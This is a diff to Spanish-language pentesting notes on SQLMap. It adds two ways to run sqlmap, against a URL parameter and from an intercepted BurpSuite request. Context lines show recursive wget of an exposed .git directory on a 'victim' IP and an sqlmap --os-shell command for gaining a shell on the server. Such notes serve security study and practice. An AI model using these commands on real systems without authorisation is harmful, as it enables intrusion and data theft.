@@ -10,7 +10,14 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 
 ## SQLMap
 
+## Primer Forma 
+
+```bash 
+❯ sqlmap -u 'http://site.com/index.php?id=1'    #Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
+```
+
 Cuando mires en una maquina victima el directorio **/.git/** quiere decir que es porque se ha clonado un directorio Git y eso puede suponer un riesgo porque si tiene capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
+
 ```bash 
 ❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
 ❯ git log                                # Pueder ves los 'commits' y su descripcion de cada cambio 
@@ -43,7 +50,15 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que es
 ❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --os-shell --batch     # Si el servidor interpreta PHP, tenemos permisos, podriamos ganar una consola interactiva 
 ```
 
-Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap y así nos diga que tipo de vulnerabilidades tiene, además de poder obtener datos a partir de ellas. Para este ejemplo usaremos **SQLI**
+
+## Segunda forma 
+
+Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap y así nos diga que tipo de vulnerabilidades tiene, además de poder obtener datos a partir de ellas. Para este ejemplo usaremos **SQLI**.
+
+```bash 
+❯ sqlmap -r peticion.txt            # Obtenemos el archivo 'peticion.txt' copiando la intercepcion del Burpsuite 
+```
+
 
 ```bash
 ❯ sqlmap -r example.req -p searchitem --batch
